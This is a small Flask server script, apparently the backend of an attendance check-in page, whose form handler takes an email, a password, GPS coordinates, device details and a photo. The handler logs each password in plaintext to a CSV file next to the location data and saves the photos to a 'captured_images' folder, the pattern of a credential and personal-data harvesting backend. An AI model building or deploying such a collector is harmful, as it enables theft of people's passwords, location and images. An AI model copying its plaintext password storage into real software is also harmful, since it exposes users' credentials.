from flask import Flask, request, render_template
import os
from datetime import datetime
import csv

app = Flask(__name__)
UPLOAD_FOLDER = "captured_images"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    password = request.form.get("password")
    latitude = request.form.get("latitude")
    longitude = request.form.get("longitude")
    device = request.form.get("device")
    photo = request.files.get("photo")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    if photo:
        filename = f"{email}_{timestamp}.jpg"
        photo.save(os.path.join(UPLOAD_FOLDER, filename))

    with open("absensi_log.csv", "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, email, password, latitude, longitude, device])

    return "OK"

@app.route("/berhasil")
def berhasil():
    return render_template("berhasil.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
